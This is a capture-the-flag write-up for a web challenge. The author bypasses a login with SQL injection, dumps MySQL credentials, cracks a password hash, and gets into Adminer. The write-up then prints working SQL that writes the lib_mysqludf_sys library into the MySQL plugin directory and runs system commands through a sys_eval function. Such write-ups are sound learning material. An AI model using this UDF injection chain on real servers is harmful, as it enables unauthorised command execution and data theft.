Before all, I've to mentionned that was the most intersting challenge and so far my favorite in web category that I've ever done in CTF :). I learn a lot

Congrats to Br1ght-D4rk for this awesome task!

So here we go!
In order to got the flag that was located directly on the server in /home, there are two steps to complete.


### **Part I: Gaining access to Adminer panel**

when we open [DarksTasks chall](http://178.63.58.69:8086/) and we see this 


![Image of Web450_index](http://saxx.swordarmor.fr/CTF/web450_index.png)


Let's now use curl and see if we get something intersting even in the headers or in the source code.<br>

![Image of Web450_curl](http://saxx.swordarmor.fr/CTF/web450_curl.png)


Hummm... we can see a comment in the source code, that looks like base64 encoding.<br>
If we decrypt it, we obtain this following message:<br>

![Image of Web450_base64](http://saxx.swordarmor.fr/CTF/web450_base64.png)


Let's connect now to this location: [Th3-D4rk-T4sks](http://178.63.58.69:8086/Th3-D4rk-T4sks/)


![Image of Web450_loginportal](http://saxx.swordarmor.fr/CTF/web450_loginportal.png)


At this point, it's obvious that we've to bypass the login form.<br>

Once again, I launch my **python script** and see if it get any success :)<br>
I've a function **loginbruteforcer** in my script which tried many sql injection payloads among direct or unband sqli, blind sqli, timed based sqli, xpath, ldap, ...<br>

![Image of Web450_validpayloads](http://saxx.swordarmor.fr/CTF/web450_validpayloads.png)


So i choosed one of the valid payloads and logged into the app to see what it looks like.


![Image of Web450_portal1](http://saxx.swordarmor.fr/CTF/web450_portal1.png)


I noticed that the id of each task are base64 encoded.<br>
So i try manually to fuzz the id to see if the id parameter was not vulnerable to sqli injection.


I used [ipyhton](http://en.wikipedia.org/wiki/IPython) for that purpose and send the same payload i used to log into the app.<br>

![Image of Web450_ipython](http://saxx.swordarmor.fr/CTF/web450_ipython.png)


Well, it works! :)

Let's provide the url and the working payload to my script and hence dump the mysql creds.<br>

![Image of Web450_mysql](http://saxx.swordarmor.fr/CTF/web450_mysql.png)


Once I got the dark's hash password, I googled quickly and found the corresponding hash for **E56A114692FE0DE073F9A1DD68A00EEB9703F3F1** is **123123**<br>

We can now log into the Adminer panel.
<br>
**NOTA**: The to Adminer panel was found by looking at the [robots.txt](http://178.63.58.69:8086/robots.txt) file.
<br>
![Image of Web450_robots](http://saxx.swordarmor.fr/CTF/web450_robots.png)<br>
<br>
![Image of Web450_admirer1](http://saxx.swordarmor.fr/CTF/web450_admirer1.png)<br>
<br>
![Image of Web450_admirer2](http://saxx.swordarmor.fr/CTF/web450_admirer2.png)<br>
<br>
<br>

### **PART II: RCE, from mysql to RCE via UDF**
<br>
For this second part of the challenge, the goal is to write into the mysql plugin directory, which is located on a unix server at /usr/lib/mysql/plugin/, the [lib_mysqludf_sys shared module](https://github.com/mysqludf/lib_mysqludf_sys). <br>
lib_mysqludf_sys is a User Defined Function library that aims to interact with the operating system via the execution environment in which MySQL runs.<br>
In one words, we will be able to execute system commands using the sql shell. 
<br>
<br>
So I compiled lib_mysqludf_sys. You can have a look at [command-execution-with-mysql-udf](http://bernardodamele.blogspot.fr/2009/01/command-execution-with-mysql-udf.html) if you want to do the same.
<br>
<br>
Then in my ipyhton term
```python
print open('/path/to/lib_mysqludf_sys.so').read().encode('hex')
```
<br>
After that, I executed these sql commands:
```sql
select unhex('THE_HEX_ENCODED_VAL_OF_UDF') into dumpfile '/usr/lib/mysql/plugin/saxx.so';
```
```sql
CREATE FUNCTION sys_eval RETURNS string SONAME 'saxx.so';
```
<br>
Now that I have my UDF uploaded, i can execute sys commands via the sqli injection.
<br>
Here is the final paylaod:<br>
```sql
select sys_eval('cat /home/Th3_D@rk_S3cr3t/FL@g_Bala7.txt')
```
<br>
Flag : **Th3_Gr3@t_7aMaDa**
<br>

I hope that you've learn some stuffs like me! ;)<br>
Once again, Congrats to Br1ght-D4rk for this incredible task! It was very fun and very instructive!<br>
<br>
Enjoyed folks :)


